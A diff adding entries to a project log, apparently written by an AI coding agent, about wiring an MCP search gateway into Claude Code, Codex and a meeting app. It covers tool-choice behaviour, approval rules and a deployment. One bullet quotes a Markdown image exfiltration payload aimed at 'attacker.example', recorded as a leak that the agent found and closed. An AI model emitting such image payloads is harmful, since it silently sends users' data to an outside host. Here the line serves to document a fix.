@@ -6,6 +6,30 @@ A dated log of what was done and decided, newest first. The plan and milestone s
 
 ## 2026-11-05
 
+- **M6: mcpgw added to Claude Code and Codex.** Both connect at user level.
+  - **Which search do they pick?** The built-in one, 4 of 4, on Claude Code and on Codex. The original finish line isn't met
+    by default.
+  - **What changes that:** one instruction worked on both. Turning the built-in off worked on Claude Code; on Codex,
+    `web_search="disabled"` fell back to another hosted search (`codex_apps search_service.web_run`), not mcpgw.
+  - **Why not force it:** with `web_fetch` not approved, mcpgw's answers were weaker. Codex ran 16 searches and said 18.4,
+    where its built-in said 18.6. Claude Code couldn't confirm a version. These were unattended runs, one each. D12 is
+    the user's call; the recommendation is to keep the built-ins and name mcpgw when wanted.
+  - **A real gap:** in Claude Code's `auto` mode, the classifier approved `web_fetch` by itself, with no prompt. "Not on the
+    allow list" isn't enough there, so it needs an `ask` rule. Auto mode refused to let me add it to the user's settings,
+    which is fair, so it's the user's step. Tested per-run: with the rule, it's denied unattended.
+  - **Codex:** `approval_mode = "prompt"` asks in a real interactive session ("Allow the mcpgw MCP server to run tool
+    "web_fetch"?"), and refuses unattended.
+  - **Services table** added to arch-infra's README.
+- **M5 done: homestorm uses mcpgw,** in its own repo (M9 there, and its ADR 0014). A real meeting in a real browser against
+  the real llmgw and mcpgw, then deployed. On the cluster: the migration landed with all 3 meetings and 42 messages intact,
+  and homestorm's real client searched through mcpgw from its pod, and had a fetch of llmgw refused by name.
+  - **Checking with thinking on changed the design:**
+    - **`tool_choice: "none"`:** DeepSeek wrote its raw `<｜｜DSML｜｜tool_calls>` markup into the answer, and Claude Opus
+      returned no text. So the forced final answer gets the research as plain text and no tools, which worked everywhere;
+    - **`tool_choice: "required"`:** llmgw refuses it for thinking Claude models, so "must search" names `web_search`.
+  - **A leak found on the way:** homestorm rendered Markdown images in answers, so a model could make the chair's browser
+    send `![](https://attacker.example/?data=…)` with no click. Images in answers no longer load.
+  - **Not checked:** a real meeting on the cluster, which needs the admin login.
 - **M5 started: streaming tools checked through llmgw,** on Claude Haiku 5.5, GPT-5.6 Luna and DeepSeek Flash, with
   mcpgw's real tool schemas. `tool_calls` assemble from their deltas, `$schema` is accepted, `tool_choice: "required"`
   and `"none"` both work, the latter with tool history, which Claude needs. DeepSeek fetched `https://www.postgresql.org/`
